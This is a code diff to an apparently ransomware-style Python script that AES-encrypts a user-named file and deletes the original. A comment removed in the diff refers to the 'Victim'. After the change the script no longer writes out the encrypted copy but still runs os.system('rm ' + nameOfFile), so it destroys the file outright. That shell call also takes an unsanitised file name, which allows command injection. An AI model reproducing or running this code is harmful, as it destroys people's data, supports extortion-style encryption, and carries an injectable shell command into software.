@@ -2,14 +2,18 @@ from Crypto.Cipher import AES
 import os
 import json
 from base64 import b64encode
+from cryptography.hazmat.primitives import padding
 
 key_length = 32
 iv_length = 16
+block_size = 16
 
 # Makes sure that the length of the message to be encrypted is a multiple of 16 bits
 def pad(msg):
-	#return msg + (16 - len(msg) % 16) * '='
-	return msg + (16 - len(msg) % 16) * chr(16 - len(msg) % 16)
+	padder = padding.PKCS7(128).padder()
+	padded_data = padder.update(msg)
+	padded_data += padder.finalize()
+	return padded_data
 
 nameOfFile = input('[*] Please Input File To Encrypt ')
 
@@ -23,9 +27,6 @@ plaintext = open(nameOfFile, "rb").read()
 plaintext = pad(plaintext)
 ciphertext = cipher.encrypt(plaintext)
 
-# Victim will keep this file and the original is deleted
-file = open("Encrypted_" + nameOfFile, "wb")
-file.write(ciphertext)
 os.system('rm ' + nameOfFile)
 
 encryption_info = dict()
